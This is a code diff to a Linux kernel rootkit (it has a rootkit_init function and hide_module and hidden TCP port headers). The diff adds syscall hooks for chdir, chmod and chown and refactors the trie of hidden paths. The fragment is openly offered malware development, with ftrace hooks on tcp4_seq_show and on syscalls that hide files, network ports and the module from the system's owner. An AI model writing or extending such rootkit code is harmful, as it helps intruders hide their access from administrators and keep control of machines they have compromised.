@@ -7,7 +7,7 @@
 #include "communicate.h"
 #include "hooked_syscalls.h"
 
-#include "hidden_files_trie.h"
+#include "hidden_paths.h"
 #include "hidden_tcp_ports.h"
 
 #include "hide_module.h"
@@ -68,6 +68,9 @@ struct syscall_hook_handle* hooks_arr[] = {
         &access_hook,
         &getdents64_hook,
         &openat_hook,
+        &chdir_hook,
+        &chmod_hook,
+        &chown_hook
 };
 
 struct ftrace_hook tcp_hook = HOOK("tcp4_seq_show", new_tcp4_seq_show, &orig_tcp4_seq_show);
@@ -93,7 +96,7 @@ rootkit_init(void) {
         remove_hidden_tcp_port(i);
     fh_install_hook(&tcp_hook);
 
-    trie = create_trie();
+    initialize_trie();
 
     return 0;
 }
@@ -114,8 +117,7 @@ void exit_my_module(void) {
     // unhook tcp handler function
     fh_remove_hook(&tcp_hook);
 
-    if (trie != 0)
-        free_trie(trie);
+    finish_trie();
 
     close_my_channel();
 
